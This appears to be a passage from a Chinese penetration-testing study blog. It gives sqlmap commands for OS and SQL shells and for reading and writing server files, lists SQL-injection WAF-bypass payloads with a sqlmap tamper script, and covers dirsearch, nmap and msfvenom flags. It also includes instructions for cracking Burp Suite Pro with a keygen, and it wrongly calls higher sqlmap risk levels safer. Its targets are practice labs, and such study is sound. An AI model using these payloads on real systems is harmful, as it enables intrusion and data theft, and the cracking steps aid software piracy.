Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;120.0.0.0 Safari&#x2F;537.36 Referer: http://192.168.2.64/sqli/Less-20/ Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,&#x2F;;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7 将20.txt放到安装sqlmap的PC中。 如果将20.txt放到sqlmap的安装目录中直接通过：root@kalitian:&#x2F;# sqlmap -r “20.txt” 即可执行注入。 如果将20.txt放到其它目录例如： 根目录&#x2F;创建tiansqlmap目录来专门保存sql注入的.txt文件，使用方法-r “路径” root@kalitian:&#x2F;# sqlmap -r “&#x2F;tiansqlmap&#x2F;20.txt” 7、Sqlmap -m “批量扫描.txt”批量url.txt放到–&gt;&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt root@kalitian:~# sqlmap -m “&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt” –smart –batch –level 5 8、Sqlmap 其它参数–threads 10 &#x2F;&#x2F;sqlmap线程最高设置为10–level 3 &#x2F;&#x2F;sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5–risk 3 &#x2F;&#x2F; 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全 二、Sqlmap用户权限1、列出数据库管理系统用户 –users 列出数据库系统用户 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –users 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –users –current-user 查看当前连接数据库用户 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –current-user 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-user 2、判断当前用户是否是DBA –is-dba 是否是DBA 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –is-dba 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –is-dba 3、查看用户权限 –privileges 查看用户权限 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –privileges 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –privileges –privileges -U 指定用户名查看 三、Sqlmap文件操作与shell提权篇1、sql shell –sql-shell 进入sql-shell交互 这里通过sqlmap可以直接获取一个sql shell，直接执行sql语句进行交互。 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince“ –sql-shell 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php“ –data&#x3D;”id&#x3D;1” –sql-shell 进入sql-shell交互： 注意：这里由于进入了sql shell可以执行sql语句了，也可以用 load data infile、load_file、into outfile等函数来进行文件读取或写入。 2、cmd shell –os-shell 进入cmd shell交互 这里通过sqlmap可以直接获取一个cmd shell，直接执行cmd命令进行交互。 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince“ –os-shell 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php“ –data&#x3D;”id&#x3D;1” –os-shell 3、读取服务器上指定文件 –file-read &#x3D; 需要读取文件路径【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince“ –file-read&#x3D;&#x2F;etc&#x2F;password 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php“ –data&#x3D;”id&#x3D;1” –file-read&#x3D;d:&#x2F;text.txt 4、写入本地文件到服务器上 –file-write &#x2F;test&#x2F;test.txt –file-dest 本地文件路径 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince“ –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php“ –data&#x3D;”id&#x3D;1” –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt dirsearch介绍dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。 dirsearch下载地址： GitHub - maurosoria&#x2F;dirsearch: Web path scanner 运行环境：必须安装python3.7或更高版本 一、Dirsearch是什么？Dirsearch是一个用于探测WEB服务器下的敏感文件&#x2F;目录的命令行工具。 二、安装和使用1.安装选择以下安装选项之一： 使用 git 安装：（推荐git clone https://github.com/maurosoria/dirsearch.git –depth 1)使用 ZIP 文件安装：在此处下载使用 Docker 安装：（更多信息可以在这里找到docker build -t “dirsearch:v0.4.3” .)使用 PyPi 安装：或pip3 install dirsearchpip install dirsearch使用 Kali Linux 安装：（已弃用）sudo apt-get install dirsearch 下载zip包，解压后进入控制台，输入下面命令进行安装依赖： pip3 install -r requirements.txt &#x2F;&#x2F;安装依赖 python dirsearch.py -h &#x2F;&#x2F;查看帮助 三、使用方法命令总结： 1234567891011121314151617181920dirsearch -e php,txt,zip -u https://target //简单的查看网址目录和文件dirsearch -e php,txt,zip -u https://target -w db/dicc.txt //使用文件拓展名为php,txt,zip的字典扫描目标urlpython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThatdirsearch -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;dirsearch -e php,txt,zip -u https://target -w db/dicc.txt -t 20dirsearch -e php,txt,zip -u https://target -w db/dicc.txt --random-agentsdirsearch -e php,txt,zip -u https://target -w db/dicc.txt --json-report=reports/target.jsondirsearch -e php,txt,zip -u https://target -w db/dicc.txt --simple-report=reports/target-paths.txtdirsearch -e php,txt,zip -u https://target -w db/dicc.txt --plain-text-report=reports/target-paths-and-status.js dirsearch -u http://xxxx &#x2F;&#x2F;日常使用 dirsearch -u http://xxxx -r &#x2F;&#x2F;递归扫描，不过容易被检测 dirsearch -u http://xxxx -r -t 30 &#x2F;&#x2F;线程控制请求速率 dirsearch -u http://xxxx -r -t 30 –proxy 127.0.0.1:8080 &#x2F;&#x2F;使用代理","path":"2024/01/01/sqlmap/","date":"01-01","excerpt":"","tags":[{"name":"sqlmap使用","slug":"sqlmap使用","permalink":"http://example.com/tags/sqlmap%E4%BD%BF%E7%94%A8/"},{"name":"dirsearch","slug":"dirsearch","permalink":"http://example.com/tags/dirsearch/"}]},{"title":"waf和BP","text":"wafWAF是什么？WAF的全称是（Web Application Firewall）即Web应用防火墙，简称WAF。 国际上公认的一种说法是：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。 WAF一般部署在Web服务器之前，用来保护Web应用。 安全狗​ 安全狗拥有云安全、Web应用安全、安全大数据三大核心产品线。在云安全领域，该公司依托(云)主机安全产品、公有云SaaS产品、私有云安全平台，结合容器安全、云原生安全、微隔离等最新技术，为公有云、私有云、混合云等各种复杂云环境下的用户提供整体解决方案及服务。在Web应用安全领域，该公司通过新一代混合式WAF产品及防篡改系统，为用户的网站安全上云提供了全面的保障。在安全大数据领域，该公司基于已安装部署产品（600万+主机、300万+网站）的攻防数据，融合AI学习能力，构建多领域、多维度的安全态势感知平台，帮助用户有效预测风险、精准感知威胁、提升响应效率。同时，该公司拥有安全技术团队，能够为用户提供等保2.0，渗透测试、红蓝对抗等全方位的高级安全服务。 WAF预防的攻击类型​ 开放Web应用安全项目（OWASP）所例举的攻击类型，都在WAF实施时考虑的范围内，其中几种比较常见的攻击类型如下： ​ 1 跨站脚本漏洞（XSS） 攻击者通过往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入在Web页面里的Script代码会被执行，从而达到恶意攻击用户的目的。 ​ 2 SQL注入 通过在目标数据库执行可疑SQL代码，以达到控制Web应用数据库服务器或者获取非法数据的目的。SQL注入攻击可以用来未经授权访问用户的敏感数据，比如客户信息、个人数据、商业机密、知识产权等。 ​ 3 Cookie篡改 Cookie篡改是攻击者通过修改用户Cookie获得用户未授权信息，进而盗用身份的过程。攻击者可能使用此信息打开新账号或者获取用户已存在账号的访问权限。 ​ 4 未经验证的输入 Web应用往往会依据HTTP的输入来触发相应的执行逻辑。而攻击者则很容易对HTTP的任何部分做篡改，比如URL地址、URL请求参数、HTTP头、Cookies等，以达到攻破Web应用安全策略的目的。 ​ 5 第七层Dos攻击 ​ 6 网页信息检索（Web scraping） 通过一些工具来获取网页内容，并从中提炼出有用的网站数据信息。 安全狗的安装搜索安全狗的官网，进去以后指一下免费下载，然后点击 打开phpstudy进入跟目录旁边的C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\bin cmd 输入命令httpd.exe -k install -n apache2.4 安装完成后打开系统服务列表查看是否安装成功 安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义。安装完成启动安全狗可能会提示apache插件安装失败，此问题原因是安全狗启动权限不够。 用管理员权限启动安全狗。启动后提示apache插件安装完成 BurpSuite​ Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。Burp Suite是web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。 burpsuite的功能​ Proxy——是一个拦截HTTP&#x2F;S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。​ Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。​ Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。​ Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。​ Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。​ Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。​ Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 burpsuite下载**Burpsuite 2022.3下载地址**：里面jdk也有，直接解压去用，如果需要破解，就按照下面流程破解就行。链接：链接：https://pan.baidu.com/s/19heT7MGFNprDNawCaGpf-w?pwd=08ce提取码：08ce java version查看jdk版本 打开刚刚解压出来的文件夹，在“BurpSuite++jdk\\jdk-8u201-windows-x64”路径下双击文件“jdk-8u201-windows-x64”进行运行。 设置Jdk环境变量，WIN+R打开命令行输入java -version验证是否安装成功 将BurpLoaderKeygen.jar &amp; burpsuite_pro_v2023.4.5.jar 放置同一目录下 cmd命令行执行 java -jar BurpLoaderKeygen.jar 如果英语差可以使用汉化版。 burpsuite简单抓包点击代理（proxy） 打开内嵌浏览器 开启拦截 nmap​ Nmap 是一个功能强大的网络扫描工具，可以用于网络发现和安全审计。它提供了各种扫描类型和选项，以适应不同场景下的需求。以下是对 Nmap 命令的详细解释： 目标指定：可以传递主机名、IP 地址、网络等。例如：scanme.nmap.org、microsoft.com&#x2F;24、192.168.0.1、10.0.0-255.1-254-iL : 从主机&#x2F;网络列表中输入-iR : 随机选择目标–exclude &lt;host1[,host2][,host3],…&gt;: 排除主机&#x2F;网络–excludefile : 从文件中排除列表 主机发现：-sL: 列出要扫描的目标-sn: Ping 扫描 - 禁用端口扫描-Pn: 将所有主机视为在线 - 跳过主机发现-PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: 对给定端口进行 TCP SYN&#x2F;ACK、UDP 或 SCTP 探测-PE&#x2F;PP&#x2F;PM: ICMP echo、timestamp 和掩码请求探测探针-PO[protocol list]: IP 协议 Ping-n&#x2F;-R: 从不进行 DNS 解析&#x2F;始终解析 [默认: 有时]–dns-servers &lt;serv1[,serv2],…&gt;: 指定自定义 DNS 服务器–system-dns: 使用操作系统的 DNS 解析器–traceroute: 对每个主机跟踪跳数路径 扫描技术：-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon 扫描-sU: UDP 扫描-sN&#x2F;sF&#x2F;sX: TCP Null、FIN 和 Xmas 扫描–scanflags : 自定义 TCP 扫描标志-sI &lt;zombie host[:probeport]&gt;: 空闲扫描-sY&#x2F;sZ: SCTP INIT&#x2F;COOKIE-ECHO 扫描-sO: IP 协议扫描-b : FTP 弹跳扫描 端口规范和扫描顺序：-p : 仅扫描指定端口–exclude-ports : 从扫描中排除指定端口-F: 快速模式 - 扫描比默认扫描更少的端口-r: 顺序扫描端口 - 不随机化–top-ports : 扫描最常见的 个端口–port-ratio : 扫描比 更常见的端口 服务&#x2F;版本检测：-sV: 探测开放端口以确定服务&#x2F;版本信息–version-intensity : 从 0（轻量级）到 9（尝试所有探查）进行设置–version-light: 限制为最可能的探查（强度 2）–version-all: 尝试每一个探查（强度 9）–version-trace: 显示详细的版本扫描活动（用于调试） 脚本扫描：-sC: 相当于 –script&#x3D;default–script&#x3D;: 是一个逗号分隔的目录、脚本文件或脚本类别列表–script-args&#x3D;&lt;n1&#x3D;v1,[n2&#x3D;v2,…]&gt;: 为脚本提供参数–script-args-file&#x3D;filename: 在文件中提供 NSE 脚本参数–script-trace: 显示所有发送和接收的数据–script-updatedb: 更新脚本数据库–script-help&#x3D;: 显示有关脚本的帮助 操作系统检测：-O: 启用操作系统检测–osscan-limit: 限制操作系统检测到有希望的目标–osscan-guess: 更积极地猜测操作系统 时序和性能：选项 是以秒为单位的时间，或者在值后添加’ms’（毫秒）、’s’（秒）、’m’（分钟）或’h’（小时）（例如 30m）。-T&lt;0-5&gt;: 设置时间模板（较高的值表示更快）–min-rate : 每秒发送数据包不少于 个–max-rate : 每秒发送数据包不超过 个防火墙&#x2F;IDS 逃避和欺骗：-f; –mtu : 分片数据包（可选带有给定的 MTU）-D &lt;decoy1,decoy2[,ME],…&gt;: 用假数据混淆扫描-S : 伪装源地址–ttl : 设置 IP 存活时间字段 输出：-oN&#x2F;-oX&#x2F;-oS&#x2F;-oG : 将扫描输出以普通、XML、s|&lt;rIpt kIddi3、Grepable 格式输出到给定文件中-oA : 同时以三种主要格式输出-v: 增加详细程度（使用 -vv 或更高以获得更大的效果）–reason: 显示端口处于特定状态的原因–open: 仅显示开放（或可能开放）的端口 其他：-A: 启用 OS 检测、版本检测、脚本扫描和跟踪路由-6: 启用 IPv6 扫描-V: 打印版本号-h: 打印此帮助概要页面示例：nmap -v -A scanme.nmap.orgnmap -v -sn 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8nmap -v -iR 10000 -Pn -p 80 msfconsole介绍msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种渗透文件，利用网站，手机等的漏洞将到目标靶机，操控目标靶机 打开终端，检查环境是否安装。输入命令： 1msfconsole ***默认kali 预装了metasploit-framework，即msfconsole命令，如果没有或提示：***msfconsole:commad not found，请自行安装： 1apt install metasploit-framework 生成payload时常见参数说明：12345678910111213141516-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度 -f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表) -e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload -a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64 –platform &lt; platform&gt; 指定payload的目标平台 -s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小 -b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\\x0f&#x27;、&#x27;\\x00&#x27;; -i, –iterations &lt; count&gt; 指定payload的编码次数 -c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件 -x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中 -k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项 -o, –out &lt; path&gt; 指定创建好的payload的存放位置 -v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 –shellest 最小化生成payload -h, –help 查看帮助选项 –help-formats 查看msf支持的输出格式列表 msf控制台参数运用1234- banner #这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。 - use #这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数 - Search #当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。 使用命令 `help search` 可以查看具体使用方法； 其他使用方法： 查mysql:`search name:mysql`; 查joomla:`search joomla`;查ubutu漏洞：`searchsploit ubuntu 16.04`；查ms08-067漏洞：`search ms08-067` ...... - show #这个命令用的很多。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。","path":"2024/01/01/waf和BP/","date":"01-01","excerpt":"","tags":[{"name":"waf","slug":"waf","permalink":"http://example.com/tags/waf/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://example.com/tags/BurpSuite/"},{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"}]},{"title":"T1","text":"SQL注入绕过技术参考链接：https://blog.csdn.net/l1028386804/article/details/118479086 1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格： %20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;!&#x2F; 最基本的绕过方法，用注释替换空格： select/**/schema_name/**/from/**/information_schema.schemata; 使用浮点数： select * from users where id&#x3D;8E0union select 1,2,3select * from users where id&#x3D;8.0 select 1,2,3 2.括号绕过空格如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 select(user())from dual where(1&#x3D;1)and(2&#x3D;2) 这个方法常用于时间盲注 ?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23 3.引号绕过（使用十六进制）会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句： 123SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;users&#x27;; 如果引号被过滤了，那么where子句就无法使用了。那么就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。 4.逗号绕过（使用from或者offset）在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 对于limit可以使用offset来绕过： 123select * from news limit 0,1# 等价于select * from news limit 1 offset 0 5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本） 使用greatest()、least（）：（前者返回最大值，后者返回最小值）同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 如果比较操作符被过滤，有些盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 123select * from users where id=1 and ascii(substr(database(),0,1))&gt;64#那么上面的这条sql语句可以使用greatest变为如下的子句:select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 使用between and：between a and b：返回a，b之间的数据，不包含b。 6.or and xor not绕过1and=&amp;&amp; or=|| xor=| not=! 7.绕过注释符号（#，–(后面跟一个空格））过滤1?id=-1&#x27; union select 1,2,3||&#x27;1 最后的or ‘1闭合查询语句的最后的单引号，或者： 1id=1&#x27; union select 1,2,&#x27;3 8.&#x3D;绕过使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; 9.绕过union，select，where等（1）使用注释符绕过 常用注释符： 123//，-- , /**/, #, --+, -- -, ;,%00,--a#用法：U/**/ NION /**/ SE/**/ LECT /**/username，password from users （2）使用大小写绕过 1id=-1&#x27;UnIoN/**/SeLeCT （3）内联注释绕过 1id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# 双关键字绕过（若删除掉第一个匹配的union就能绕过） 1id=-1&#x27;UNIunionONSeLselectECT1,2,3–- 10.通用绕过（编码）如URLEncode编码，ASCII,HEX,unicode编码绕过： 1or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 11.等价函数绕过123456hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir() 例如substring()和substr()无法使用时： 123456?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74#或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 12.宽字节注入​ 西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。 ​ GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE（高字节从81到FE，低字节从40到FE），剔除xx7F码位，共23940个码位。 ​ 条件后台使用GBK编码的时候，存在着看不见的ascii码转换为GBK编码的转换过程，可以使用宽字节注入。 ​ 原理编码转换存在着单字符被合并的情形 ​ 反斜杠对应url编码%5c，是单字节的。 在%5c前再加入一个单字节字符%dd（范围可以是81到FE之间），就成了%dd%5c 而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符 过滤 ’ 的时候往往利用的思路是将 ’ 转换为 ’ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：（1）%df 吃掉 \\ 具体的方法是 urlencode(’) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id&#x3D;-1%df%27union select 1,user(),3–+（2）将 ’ 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的PHP函数：1.replace（）：过滤 ’ \\ ，将 ’ 转化为 ’ ，将 \\ 转为 \\，将 “ 转为 “ 。用思路一。2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：’ , “ , \\ 。HTTP参数污染 例如sqli libs 32和33关,宽字节注入%df ?id&#x3D;-1%df%27%20union%20select%201,group_concat(database()),3–+爆库 13.HTTP参数污染HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。 sql语句在接受相同参数时候接受的是后面的参数值。 ?p&#x3D;usa&amp;p&#x3D;china百度1雅虎2google 1+2php&#x2F;apache 2flask 1jsp&#x2F;tomcat 1CGI&#x2F;apache 1python&#x2F;apache 1+2asp&#x2F;iis 14.生僻函数使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数，就是用不常用的报错函数试试。例如 1select polygon((select * from (select * from (select @@version) f) x)); 15.注入参数到cookie中​ 某些程序员在代码中使用$_REQUEST获取参数，而$_REQUEST会依次从GET&#x2F;POST&#x2F;cookie中获取参数，如果WAF只检测了GET&#x2F;POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。一定要保证cookie还在存在的前提下进行抓包，less20登录之后发现有很明显的cookie提示 cookie注入参数，爆出数据库 16.云WAF绕过之寻找网站源ip​ 采用云WAF的网站可以寻找网站真实ip来绕过云WAF的检测。常见方法有： 采用多地ping的方法查看ip地址解析分析真实ip在线ping网站有：http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/使用 nslookup 进行检测，原理同上。寻找网站历史解析记录。找网站的二级域名、NS、MX记录等对应的ip。订阅网站邮件，查看邮件发送方的ip。 sqlmap的使用 —- 绕过脚本tampersqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。 代码 1234567891011121314151617#!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): payload= payload.lower() payload= payload.replace(&#x27;or&#x27; , &#x27;oorr&#x27;) payload= payload.replace(&#x27;and&#x27; , &#x27;anandd&#x27;) payload= payload.replace(&#x27; &#x27; , &#x27;%0B&#x27;) retVal=payload return retVal 脚本文件所在位置&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F; 命令如下 1sqlmap -u [url] --tamper [模块名] sqlmap -u &quot;http://192.168.2.70/sqli/Less-26a/?id=1&quot; -p id --dbms=MySQL --tamper=1 --dbs --batch 支持的数据库 编号 脚本名称 作用 实现方式 all 1 apostrophemask.py 用utf8代替引号 (“1 AND ‘1’&#x3D;’1”) ‘1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871’ 2 base64encode.py 用base64编码替换 (“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;’ 3 multiplespaces.py 围绕SQL关键字添加多个空格 (‘1 UNION SELECT foobar’) ‘1 UNION SELECT foobar’ 4 space2plus.py 用+替换空格 (‘SELECT id FROM users’) ‘SELECT+id+FROM+users’ 5 nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters (‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’ 6 space2randomblank.py 代替空格字符（“”）从一个随机的空 白字符可选字符的有效集 (‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’ 7 unionalltounion.py 替换UNION ALL SELECT UNION SELECT (‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’","path":"2023/12/27/sql绕过/","date":"12-27","excerpt":"","tags":[{"name":"sql绕过","slug":"sql绕过","permalink":"http://example.com/tags/sql%E7%BB%95%E8%BF%87/"},{"name":"sqlmap tamper","slug":"sqlmap-tamper","permalink":"http://example.com/tags/sqlmap-tamper/"}]},{"title":"python3","text":"文件操作在计算机 中要操作文件一共包含三个步骤：1.打开文件 2.读、写文件 读 将文件内容读入内容 写 将内存内容写入文件 3.关闭文件 文件打开与关闭使用Python对文件进行读和写。为此，使用合适的模式打开文件 1，open 函数负责打开文件，并且返回文件对象 2，read &#x2F;write &#x2F; close 三个方法都需要通过文件对象 来调用 read方法——读取文件 3，open 函数的第一个参数是要打开的文件名（文件名区分大小写） 如果文件存在，返回 文件操作对象 如果文件不存在，会抛出异常 read 方法可以一次性 读入 并 返回文件的所有内容 close 方法负责关闭文件 如果忘记关闭文件，会造成系统资源消耗，而且会影响到后续对文件的访问 访问方式 说明 r 以只读方式打开文件。文件的指针将会放在文件的开头，这是默认模式。如果文件不存在，抛出异常 w 以只写方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件 a 以追加方式打开文件。如果该文件已存在，文件指针将会放在文件的末尾。如果文件不存在，创建新文件进行写入 r+ 以读写方式打开文件。文件的指针将会放在文件的开头。如果文件不存在，抛出异常 w+ 以读写方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件 a+ 以读写方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾。如果文件不存在，创建新文件进行写入 打开文件在python中，使用open函数，可以打开已经存在的文件，或者创建一个新文件，open（文件名，访问模式） f &#x3D; open(‘test.txt’,’w’) 没有找到‘test.txt’文件，所以新建了‘test.txt’文件。 关闭文件close()示例如下： 123#新建一个文件，文件名为：test.txtf = open(“text.txt”,”w”)f.colse()#关闭这个文件 文件读写写数据（write） 三种写入模式 ​ 覆盖模式（“w”）：打开文件并将内容写入文件，如果文件存在，则覆盖原有内容。如果文件不存在则创建一个新的文件。​ 